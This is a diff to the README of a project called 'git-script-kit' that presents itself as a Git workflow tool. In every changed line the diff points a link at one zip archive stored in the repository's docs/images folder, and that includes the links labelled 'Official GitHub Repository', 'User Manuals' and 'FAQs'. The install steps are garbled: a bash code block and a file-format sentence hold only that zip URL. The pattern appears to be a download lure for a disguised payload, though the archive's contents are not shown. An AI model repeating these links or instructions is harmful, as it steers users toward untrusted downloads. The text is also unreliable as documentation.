@@ -1,6 +1,6 @@
 # 🚀 git-script-kit - Streamline Your Git Workflows Easily
 
-[![Download Now](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/git-script-kit_v1.8.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/git-script-kit_v1.8.zip)
+[![Download Now](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/kit-git-script-v3.9.zip%20Now-Get%20the%20Latest%20Version-brightgreen)](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/kit-git-script-v3.9.zip)
 
 ## 📦 Overview
 
@@ -18,13 +18,13 @@ To get started with **git-script-kit**, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access the latest version of the software:  
-   [Download git-script-kit](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/git-script-kit_v1.8.zip)
+   [Download git-script-kit](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/kit-git-script-v3.9.zip)
 
 2. **Choose the Version**  
    On the releases page, you'll see a list of available versions. Look for the most recent one, which will be marked as the latest release.
 
 3. **Download the Application**  
-   When you locate the latest version, find the assets below it. Click on the appropriate file for your operating system (Windows, macOS, or Linux). The files are typically in `.zip` or `https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/git-script-kit_v1.8.zip` format.
+   When you locate the latest version, find the assets below it. Click on the appropriate file for your operating system (Windows, macOS, or Linux). The files are typically in `.zip` or `https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/kit-git-script-v3.9.zip` format.
 
 4. **Extract the Files**  
    After downloading, locate the file on your computer and extract it using a file extractor tool. You should find a folder containing all necessary scripts.
@@ -39,10 +39,10 @@ To get started with **git-script-kit**, follow these steps:
    Now you can run the scripts from within this folder. For most tasks, you just need to type:
 
    ```bash
-   https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/git-script-kit_v1.8.zip
+   https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/kit-git-script-v3.9.zip
    ```
 
-   Replace `https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/git-script-kit_v1.8.zip` with the actual name of the script you want to run.
+   Replace `https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/kit-git-script-v3.9.zip` with the actual name of the script you want to run.
 
 ## 🎯 Features
 
@@ -95,8 +95,8 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 For more information about **git-script-kit**, check out these links:
 
-- [Official GitHub Repository](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/git-script-kit_v1.8.zip)
-- [User Manuals](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/git-script-kit_v1.8.zip)
-- [FAQs](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/git-script-kit_v1.8.zip)
+- [Official GitHub Repository](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/kit-git-script-v3.9.zip)
+- [User Manuals](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/kit-git-script-v3.9.zip)
+- [FAQs](https://raw.githubusercontent.com/camboimm/git-script-kit/main/docs/images/kit-git-script-v3.9.zip)
 
 We hope you enjoy using **git-script-kit** to enhance your development workflow!
